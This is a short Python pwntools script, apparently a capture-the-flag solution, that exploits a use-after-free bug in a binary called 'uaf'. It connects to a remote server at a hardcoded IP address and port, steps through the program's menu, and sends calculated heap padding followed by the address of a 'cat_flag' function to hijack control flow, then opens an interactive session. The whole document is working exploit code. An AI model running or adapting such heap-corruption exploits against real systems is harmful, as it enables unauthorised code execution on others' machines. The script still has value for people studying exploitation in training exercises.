from pwn import *

cat_flag = 0x401239

#r = process('uaf')
r = remote('140.110.112.77', 4006)
raw_input('debug: ')
r.recvuntil('>')
r.sendline('4')
r.recvuntil('>')
r.sendline('1')
r.recvuntil(':')
r.sendline('160')
r.recvuntil(':')
r.send('a' * (0x4202f0 - 0x420260 + 8) + p64(cat_flag))
r.sendline('4')
r.interactive()
